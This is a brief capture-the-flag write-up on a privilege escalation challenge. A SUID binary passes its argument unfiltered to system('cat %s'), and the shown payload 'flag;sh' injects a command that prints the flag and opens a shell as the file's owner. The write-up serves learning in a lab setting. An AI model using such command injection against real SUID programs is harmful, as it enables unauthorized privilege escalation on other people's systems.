This is a basic Privilege Escalation challenge that exploits a file with the SUID bit and a Command Injection vulnerability.

## Challenge Overview
This is a basic Privilege Escalation challenge that exploits a file with the SUID bit and a Command Injection vulnerability.

## Analysis

### SUID Bit
- The `ls -l chall` command reveals the file has `-rwsr-xr-x` permissions
- Owned by the user `dream`
- The `s` in permissions indicates the SUID bit is set
- When executed, the program runs with `dream`'s permissions (euid = dream, ruid = chall)

### Command Injection
- The program takes `argv[1]` and passes it directly to `system("cat %s")`
- No input filtering is performed
- We can use semicolon (`;`) to inject additional commands

## Exploitation

1. **SSH and Gather UIDs**
    ```bash
    chall@localhost:~$ id chall
    uid=1000(chall) gid=1000(chall) groups=1000(chall)
    chall@localhost:~$ id dream
    uid=2123(dream) gid=1001(dream) groups=1001(dream)
    ```
    - Found ruid: `1000`
    - Found euid: `2123`

2. **Execute Payload**
    ```bash
    chall@localhost:~$ ./chall "flag;sh"
    Your ruid :
    1000
    Your euid :
    2123
    Your ruid : 2123 Your euid : 2123
    DH{*******}
    ```
    - Payload `flag;sh` injects a command after `cat`
    - Program executes `cat flag;sh`, displaying the flag
    - We get a shell with `dream`'s privileges